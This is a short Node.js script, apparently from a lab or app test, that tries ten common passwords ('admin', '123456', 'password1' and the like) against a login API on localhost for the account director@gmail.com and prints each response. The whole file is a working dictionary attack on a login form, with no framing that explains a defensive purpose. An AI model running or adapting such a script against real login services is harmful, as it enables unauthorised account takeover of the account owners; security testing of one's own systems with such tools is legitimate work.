import fetch from 'node-fetch';

const candidates = ['director', 'director123', 'password', 'admin', '123456', '12345678', 'admin123', 'password1', 'pass123', 'welcome'];
for (const password of candidates) {
  const res = await fetch('http://localhost:3000/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'director@gmail.com', password })
  });
  const data = await res.json();
  console.log(password, res.status, JSON.stringify(data));
}
